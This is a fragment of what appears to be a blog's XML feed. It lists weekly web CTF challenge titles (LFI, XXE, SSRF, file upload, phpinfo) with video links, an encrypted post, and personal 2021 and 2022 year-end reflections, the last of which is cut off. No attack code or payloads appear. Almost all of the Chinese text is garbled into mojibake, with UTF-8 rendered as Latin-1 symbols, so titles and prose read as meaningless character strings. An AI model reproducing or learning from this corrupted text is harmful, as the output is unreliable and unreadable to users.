        <content type="html"><![CDATA[<h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a></p><h1 id="ç¬¬åå‘¨-è¯•è¯•åè®®å§"><a href="#ç¬¬åå‘¨-è¯•è¯•åè®®å§" class="headerlink" title="ç¬¬åå‘¨ | è¯•è¯•åè®®å§"></a>ç¬¬åå‘¨ | è¯•è¯•åè®®å§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1Hz411v7c7">ç¬¬åå‘¨ | è¯•è¯•åè®®å§</a></p><hr><h1 id="ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«"><a href="#ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«" class="headerlink" title="ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«"></a>ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18v411q7mr">ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</a></p><hr><h1 id="ç¬¬åäºŒå‘¨-easy-LFI"><a href="#ç¬¬åäºŒå‘¨-easy-LFI" class="headerlink" title="ç¬¬åäºŒå‘¨ | easy LFI"></a>ç¬¬åäºŒå‘¨ | easy LFI</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1jD4y1U7Vy">ç¬¬åäºŒå‘¨ | easy LFI</a></p><hr><h1 id="ç¬¬åä¸‰å‘¨-simple-xxe"><a href="#ç¬¬åä¸‰å‘¨-simple-xxe" class="headerlink" title="ç¬¬åä¸‰å‘¨ | simple xxe"></a>ç¬¬åä¸‰å‘¨ | simple xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1eT4y1j7ff/">ç¬¬åä¸‰å‘¨ | simple xxe</a></p><hr><h1 id="ç¬¬åå››å‘¨-blind-xxe"><a href="#ç¬¬åå››å‘¨-blind-xxe" class="headerlink" title="ç¬¬åå››å‘¨ | blind xxe"></a>ç¬¬åå››å‘¨ | blind xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1nK411n7G9/">ç¬¬åå››å‘¨ | blind xxe</a></p><hr><h1 id="ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF"><a href="#ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF" class="headerlink" title="ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF"></a>ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18f4y197Lz/">ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</a></p><hr><h1 id="ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF"><a href="#ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF" class="headerlink" title="ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF"></a>ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1g54y1U7Gj/">ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</a></p><hr><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,1-9å‘¨</title>
      <link href="/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/"/>
      <url>/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦"><a href="#ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦" class="headerlink" title="ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦"></a>ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1DA411q7Go">ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</a></p><hr><h1 id="ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™"><a href="#ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™" class="headerlink" title="ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™"></a>ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1np4y1X7L5">ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</a></p><hr><h1 id="ç¬¬ä¸‰å‘¨-è¿·äº†è·¯"><a href="#ç¬¬ä¸‰å‘¨-è¿·äº†è·¯" class="headerlink" title="ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯"></a>ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV16K4y1t7jg">ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</a></p><hr><h1 id="ç¬¬å››å‘¨-Check-your-source-code"><a href="#ç¬¬å››å‘¨-Check-your-source-code" class="headerlink" title="ç¬¬å››å‘¨ | Check your source code"></a>ç¬¬å››å‘¨ | Check your source code</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1254y1D7Jy">ç¬¬å››å‘¨ | Check your source code</a></p><hr><h1 id="ç¬¬äº”å‘¨-Easy-upload"><a href="#ç¬¬äº”å‘¨-Easy-upload" class="headerlink" title="ç¬¬äº”å‘¨ | Easy upload"></a>ç¬¬äº”å‘¨ | Easy upload</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1KT4y1g7kr">ç¬¬äº”å‘¨ | Easy upload</a></p><hr><h1 id="ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "><a href="#ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "></a>ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1mZ4y1p7vz">ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ "><a href="#ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ " class="headerlink" title="ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ "></a>ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1J5411x7Pt">ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </a></p><hr><h1 id="ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ "><a href="#ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ "></a>ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV14K411n7Wx">ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a><br><br></p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2020/05/08/hello/"/>
      <url>/2020/05/08/hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="nonono" data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="de5ffb3c355c37ef799db2811598b2e070118f1713db3c35b69817df54f1f8bd">7d8077bcea34d13a4778951ea2d2a1ccce0256bcc5d53f74bd6a858a945ec856276f2040ce3d91d145e95f65e63f536f564e07d3cc9ab9bb1fec22f262ad5a1e4fc99d0818f3a1cac7c2a6ea11b53f62975da05ba3343ad48b5b02b81e9efdecc44f4cfae33f5b10a48fc74460bc07491e960d4fafcb54b004ecfbeea566d704f0c8dbe63cbc78689d284f0b5ad3a587f242b222d0b826a89be3bd4b53523e4bc9784da2af2b9a4b4964e07bf508abff229ea78940ea4ab41dcb1bc2e390f9b90a3a4d5305b40a26e6a9bff33925686133c51d622f4a40bd556070284614620e2478b030f3e24a2f0fc1059e8599c5d6d0113e42c0625302624527d4c5bbe72d2047dfe2b04d78e73e5a0e581acdfd5e25fa6e38bd1cc24c265adf6d30fc068f6c4a4780a711c842d7a61d4a47ee8279eddfe9b090d6b98ab038348eeb86901f543edcd2263d3754d9ba2365ec8b1ada36f8cd6f88f8f0487f1f87c6cb1f2d436f513591ad5424d63cac089b792a884c4b773dc9738c626011ece68dbfe6a418dd7dada87289fa995942802846b8636490a62484c23728ffde04fc9f4475713dee7b1cfdf174e13d275c70ceeda5876c7392d6f064ec19ebaf13a894258a7d8577b9e722cfa10daef2e53f7918b0aeab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">please input my name</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2021</title>
      <link href="/2000/01/31/my2021/"/>
      <url>/2000/01/31/my2021/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°å•¦ï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹å•¦ï¼<br>å¾ˆå¿«ï¼Œ2021å¹´å·²ç»è¿‡å»äº†ï¼Œæ„Ÿè§‰è¿˜æ²¡å­¦åˆ°ä»€ä¹ˆæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚ä¸€å¹´ç¡®å®ä¹Ÿè®¤è¯†äº†å¥½å¤šå¥½å¤šçš„äººï¼Œä¹Ÿç»å†äº†å¥½å¤šå¥½å¤šçš„äº‹æƒ…ï¼Œåœ¨æ­¤ä¹Ÿè®°å½•ä¸‹2021å¹´æ‰€å‘ç”Ÿæœ‰è¶£ä¸”æœ‰æ„ä¹‰çš„äº‹æƒ…å§ã€‚</p><p><img src="/images/my2021/1.png" alt="image-20220130142802861"></p><p>ä¸€äºŒä¸‰æœˆä»½éƒ½åœ¨å‡†å¤‡è€ƒè¯•ï¼Œæœ€åä¸ç®¡æ€ä¹ˆæ ·å§ï¼Œè€ƒä¸Šäº†ï¼Œè¿˜æ˜¯æŒºé«˜å…´çš„ã€‚</p><p>äº”æœˆä»½ï¼Œé¦–å…ˆåœ¨è¿˜æ˜¯è¦æ„Ÿè°¢æ¾³å“¥å¸¦æˆ‘æ‰“è¿›é“äººæ€»å†³èµ›å§ï¼Œäººç”Ÿä¸­ç¬¬ä¸€æ¬¡åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šï¼Œå’Œä¼—å¤šé«˜æ ¡çš„å°ä¼™ä¼´ä¸€èµ·æ‰“æ¯”èµ›ï¼ŒçœŸçš„æ˜¯å¤ªå¼ºäº†ï¼Œæ„Ÿå—é¢‡å¤šã€‚æ‰“æ¯”èµ›å¾ˆç´¯ï¼Œåšä¸å‡ºé¢˜æ¥ï¼Œæ›´ç´¯ã€‚è¿˜æ˜¯é‚£å¥è¯äººå¤–æœ‰äººï¼Œå¤©å¤–æœ‰å¤©ï¼Œå¼ºçš„äººçœŸæ˜¯å¤ªå¤šäº†ï¼Œä¸åŠªåŠ›çš„è¯ï¼ŒçœŸçš„å•¥ä¹Ÿä¸æ˜¯ã€‚è®°å½•ä¸€ä¸‹å‚èµ›è¿‡ç¨‹å§ï¼Œè´´ä¸¤å¼ ç…§ç‰‡ã€‚æ„Ÿè°¢æ¾³å“¥ã€‚<img src="/images/my2021/2.png" alt="image-20220130144246418"></p><p><img src="/images/my2021/3.png" alt="image-20220130144314957"></p><p><img src="/images/my2021/4.png" alt="image-20220130144329029"></p><p><img src="/images/my2021/5.png" alt="image-20220130144830848"></p><p>äº”æœˆä»½ä½œä¸ºç‰¹é‚€æˆ˜é˜Ÿå‚åŠ äº†æ´¥é—¨æ¯ï¼Œæ„Ÿè°¢å¼ è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ï¼Œè®©æˆ‘å¸¦é˜Ÿï¼Œå¸¦å­¦å¼Ÿå’Œå­¦å¦¹å‚åŠ æ¯”èµ›ï¼ŒçœŸæ˜¯åˆ°äº†èµ›åœºä¸Šæ‰çŸ¥é“è‡ªå·±æœ‰å¤šèœï¼Œååœ¨ç”µè„‘å‰å°±å¾ˆç´§å¼ ï¼Œä¸€ä¼šå¹²è¿™ï¼Œä¸€ä¼šå¹²é‚£ï¼Œæ‰‹å¿™è„šä¹±çš„ï¼Œæœ€ä¸»è¦çš„åŸå› è¿˜æ˜¯è„‘å­é‡Œæ²¡æœ‰é‚£ä¹ˆå¤šä¸œè¥¿å§ï¼Œé‚£äº›é«˜æ ¡æˆ˜é˜ŸçœŸçš„å¤ªå¼ºäº†ï¼Œè¢«æ‰“çš„å¾ˆæƒ¨ã€‚ä¸è¿‡ï¼Œæœ€åä¹Ÿæœ‰å¹¸ä¹Ÿå»äº†ä¸–ç•Œæ™ºèƒ½å¤§ä¼šï¼Œè™½ç„¶æ²¡å¬æ‡‚å§ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è£…å¬æ‡‚äº†å§ã€‚è´´ä¸¤å¼ ç…§ç‰‡è®°å½•ä¸€ä¸‹å§ã€‚æ„Ÿè°¢å¼ è€å¸ˆå’Œå­¦å¼Ÿå­¦å¦¹ã€‚</p><p><img src="/images/my2021/6.png" alt="image-20220130145559697"></p><p><img src="/images/my2021/7.png" alt="image-20220130145615187"></p><p><img src="/images/my2021/8.png" alt="image-20220130145623269"></p><p><img src="/images/my2021/9.png" alt="image-20220130145635833"></p><p><img src="/images/my2021/10.png" alt="image-20220130145713244"></p><p><img src="/images/my2021/11.png" alt="image-20220130150437476"></p><p>å…­æœˆåº•ä¸ƒæœˆåˆä¹Ÿä¸ºå›½å®¶åšäº†ä¸€äº›è´¡çŒ®å§ã€‚å½“ç„¶ä¹Ÿç»™è‡ªå·±å¢åŠ æŠ€æœ¯å’Œç»éªŒä»¥åŠå±¥å†äº†ã€‚æ„Ÿè°¢ç»³å“¥ã€‚</p><p>ä¹æœˆä»½ç¬¬ä¸€æ¬¡ç«™åœ¨è¿™ä¹ˆå¤§çš„èˆå°ä¸Šæ¼”è®²ï¼Œå¾ˆç´§å¼ ï¼Œä¹Ÿå¾ˆæœŸå¾…ã€‚æ€»ä½“æ¥è¯´è¿˜ç®—æˆåŠŸå§ï¼Œæ„Ÿè°¢å°ä¼™ä¼´å¸®æˆ‘æ‹çš„ç…§ï¼Œè´´ä¸€å¼ å§ã€‚æ‰“ç æ‰“ç ã€‚</p><p><img src="/images/my2021/12.png" alt="image-20220130163040609"></p><p>åæœˆä»½ã€‚æ„Ÿè°¢äºè€å¸ˆã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åä¸€æœˆä»½ä¹Ÿå»äº†æµ·æ²³å·¥åŒ æ¯ï¼Œæˆç»©ä¸­è§„ä¸­çŸ©å§ï¼Œè¯ä¹¦å°±ä¸è´´äº†ï¼Œä¹Ÿæ²¡å•¥æ„æ€ã€‚ä¸è¿‡é‚£å¤©èµ·çš„éå¸¸æ—©ï¼Œé›ªéå¸¸å¤§ï¼Œé£éå¸¸å¤§ï¼Œè·¯éå¸¸æ»‘ï¼Œå¤©ä¹Ÿè´¼å†·ã€‚</p><p>è¿˜æœ‰å¤©æ´¥å¸‚èµ›ï¼Œç¬¬ä¸€æ¬¡å‚åŠ ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œæ²¡æœ‰æ‹¿åˆ°åæ¬¡ï¼Œæ„§ç–šäº†å¥½ä¹…ï¼Œè¾œè´Ÿäº†è¥¿æ™®è€å¸ˆå¯¹æˆ‘çš„æœŸæœ›ï¼Œå“ï¼Œè°ä¹Ÿä¸æ€ªï¼Œåªèƒ½è¯´å‡†å¤‡çš„ä¸å……åˆ†ã€‚äººå®¶æ¯”æˆ‘ä»¬å‡†å¤‡çš„å¤šï¼Œå“ï¼Œæ²¡åŠæ³•ï¼Œæ€»ç»“æ•™è®­ï¼Œç»§ç»­åŠªåŠ›å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆï¼Œæ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä»¬ã€‚</p><p>æ„Ÿè°¢é™ˆè€å¸ˆçš„é”®ç›˜å’Œé¼ æ ‡ã€‚</p><p>æ„Ÿè°¢éƒ­è€å¸ˆå¯¹æˆ‘çš„ä¿¡ä»»ã€‚è®©æˆ‘èƒ½æœ‰ä¸€æ¬¡é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚</p><p>åé¢å°±æ˜¯éå¸¸å¹¸è¿çš„è¿›å…¥äº†è¥¿æ™®è¿™ä¸ªå¤§å®¶åº­å§ï¼Œè®¤è¯†äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„è€å¸ˆã€‚å¸Œæœ›èƒ½åœ¨è¿™é‡Œä¸æµªè´¹æ—¶é—´ï¼Œå­¦ä¹ åˆ°æ›´å¤šçŸ¥è¯†å§ã€‚æ„Ÿè°¢è¥¿æ™®çš„è€å¸ˆã€‚</p><p>æ„Ÿè°¢å‡¡å“¥å¯¹æˆ‘çš„ä¿¡ä»»ã€‚æˆ‘å°½åŠ›ã€‚</p><p>æ„Ÿè°¢çˆ¶æ¯ã€‚</p><p>ä»Šå¹´ä¹Ÿé‡åˆ°äº†è®¸å¤šå¯çˆ±çš„å°ä¼™ä¼´ï¼Œå’Œå‰å®³çš„å¸ˆå‚…ï¼Œå­¦åˆ°äº†å¾ˆå¤šä»¥å‰æ²¡æœ‰è§è¿‡çš„ä¸œè¥¿ã€‚ä»Šå¹´ä¹Ÿæµªè´¹äº†å¥½å¤šçš„æ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„äº‹æƒ…ä¸Šï¼Œæ˜å¹´æˆ–è®¸ä¹Ÿä¼šèŠ±è®¸å¤šæ—¶é—´æ”¾åœ¨è‡ªå·±ä¸å–œæ¬¢çš„åœ°æ–¹ï¼Œå“æ²¡åŠæ³•ï¼Œè°è®©è‡ªå·±èµ·ç‚¹ä½å‘¢ã€‚åŠ æ²¹å§ï¼</p><p>å¥½ä¹…å¥½ä¹…ä»¥å‰å°±æœ‰äº†è¿™ä¸ªåšå®¢ï¼Œä½†æ˜¯ç”±äºå„ç§å„æ ·çš„åŸå› å§ï¼Œéƒ½æ²¡æœ‰åŠæ—¶çš„æ›´æ–°æ–‡ç« ï¼Œæœ‰çš„æ—¶å€™æ„Ÿè§‰ä¸€ä¸ªå°æ¯”èµ›å°±è§£å‡ºæ¥ä¸€é“é¢˜ï¼Œæˆ–ç®€å•çš„é¢˜ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œä½†æ˜¯åæ¥åœ¨é‡åˆ°è¿™ä¸ªé¢˜å‘ç°æ˜¯ä»¥å‰è§åˆ°è¿‡çš„ï¼Œæœ‰æ²¡æœ‰ç¬”è®°ï¼Œå„ç§ç™¾åº¦æµªè´¹æ—¶é—´ï¼Œè¿˜æ‰¾ä¸åˆ°è‡ªå·±æƒ³è¦çš„ã€‚å¦ä¸€æ–¹é¢æ„Ÿè§‰åšè¿™ä¸ªäº‹æƒ…ä¹Ÿæ˜¯æŒºé”»ç‚¼è‡ªå·±çš„ï¼Œå†™å‡ºæ¥è§£é¢˜è¿‡ç¨‹å¾ˆå¼€å¿ƒã€‚ä»¥åä¼šç›‘ç£è‡ªå·±ï¼Œæ—¶å¸¸æ›´æ–°åšå®¢ï¼Œå¤šåšé¢˜ã€‚è¯´çš„å†å¤šï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯è‡ªå·±å¤ªæ‡’äº†å§ã€‚ä»¥åå‹¤å¥‹ä¸€äº›ã€‚å¤šåšæœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚å¤šæ›´åšå®¢ã€‚</p><p>â€æˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚æˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œä½ ä¸‹é¢æ˜¯ä¸‡ä¸ˆæ·±æ¸Šï¼Œè€Œä½ è¦å¾’æ‰‹æ”€å²©ï¼Œä»ä¸€ä¸ªå‚ç›´å¡åº¦çš„å±±è„šï¼Œçˆ¬åˆ°ä¸Šåƒç±³çš„å±±é¡¶ã€‚ç”¨è„šæŒ‡å¤´éƒ½èƒ½æƒ³åˆ°ï¼Œä½ æ­»äº¡çš„åœºæ™¯æ— æ•°ä¸ªï¼Œåªè¦ä¸€æ¬¡å¤±è¯¯ä½ å°±å¯èƒ½æ‰è½å±±å´–ç²‰èº«ç¢éª¨ï¼Œè€Œä½ çš„æˆåŠŸåœºæ™¯åªæœ‰ä¸€ä¸ªï¼šæ´»ç€ä¸Šå»ã€‚æ‰€ä»¥ä½ å¯¹è¿™åº§å±±è¦æœ‰å¿ƒå­˜æ•¬ç•ï¼Œè¦å°å¿ƒç¿¼ç¿¼ï¼Œä¸ç‚«æŠ€ä¸å¼ æ‰¬ï¼Œä½ è¦è°ƒæ•´åˆ°æœ€è°¦å‘çš„çŠ¶æ€ï¼Œè¿œç¦»å–§åš£ï¼Œå¬åˆ°è‡ªå·±å¿ƒè·³çš„å£°éŸ³ï¼Œæ•¬ç•æ¯ä¸€ä¸ªæŠ“æ‰‹ç‚¹ã€‚æŠ“æ‰‹çš„ç‚¹å¾ˆå¤šï¼Œæœ‰å¤§æœ‰å°ï¼Œä½ ä¸èƒ½é‡è§†ä¸€ä¸ªè€Œè½»è§†å¦ä¸€ä¸ªï¼Œå› ä¸ºä½ è½»è§†ä»»ä½•ä¸€ä¸ªçš„åæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯æ­»äº¡ã€‚â€œ  </p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><p>ç”Ÿæ—¥å¿«ä¹~<br><img src="/images/my2021/13.png" alt="image-20220130172521536"></p><blockquote><p>ç”Ÿæ—¥å¿«ä¹<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š</p><p>date: 2022-01-31 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2022</title>
      <link href="/2000/01/20/my2022/"/>
      <url>/2000/01/20/my2022/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆï¼Œæ–°å¹´åˆ°äº†ï¼Œç¥å¤§å®¶æ–°å¹´å¿«ä¹å–½ï¼<br>å¾ˆå¿«ï¼Œ2022å¹´å·²ç»è¿‡å»äº†ï¼Œ2023å¹´å·²ç»è¿‡å»20å¤šå¤©äº†ï¼Œæ—¶é—´å°±å¾ˆå¿«çš„è¿‡å»äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯è‡ªå·±æ²¡æœ‰æŠŠæ¡å¥½æ—¶é—´å§ã€‚åœ¨è¿‡å»çš„ä¸€å¹´ä¸­è®¤è¯†äº†ä¸€äº›äººï¼Œéƒ½éå¸¸æœ‰è¶£ã€‚ä¹Ÿé‡åˆ°äº†å¾ˆå¤šæœ‰è¶£çš„äº‹æƒ…ã€‚</p><p>æ„Ÿè°¢jackieå“¥ç»™æˆ‘æ¨é‡ä¿ï¼ŒäºŒæœˆä»½å†¬å¥¥ä¼šå»é‡ä¿ï¼Œè®¤è¯†äº†å¥½å‡ ä¸ªæœ‰è¶£çš„å“¥å“¥ï¼Œäººéƒ½æŒºå¥½çš„ï¼Œè¿˜æ€»å¸®æˆ‘ç™»æœºå™¨ã€‚æ„Ÿè°¢ã€‚åé¢è¿˜å¸®ä»–ä»¬å†™äº†ä¸ªå°è„šæœ¬ï¼Œå¸®ä»–ä»¬ç­›é€‰æ—¥å¿—ä¸­æœ‰ç”¨ä¿¡æ¯å¯¼å‡ºexcelï¼Œç”±äºå†…ç½‘ä½¿ç”¨è¿˜å°æˆäº†exeï¼Œå®Œäº‹åé‚£è¾¹çš„å“¥è¯´è´¼è¿˜ç”¨ï¼Œå¸®ä»–ä»¬çœå»äº†90%çš„æ—¶é—´ï¼Œè¿˜å¾ˆæ„Ÿè°¢æˆ‘ã€‚ç¬é—´æ„Ÿè§‰å…¶å®çœ‹è®¾å¤‡ä¸é€‚åˆæˆ‘ï¼Œæˆ‘æ„Ÿè§‰è¿ç»´æ¯”è¾ƒé€‚åˆæˆ‘ã€‚å› 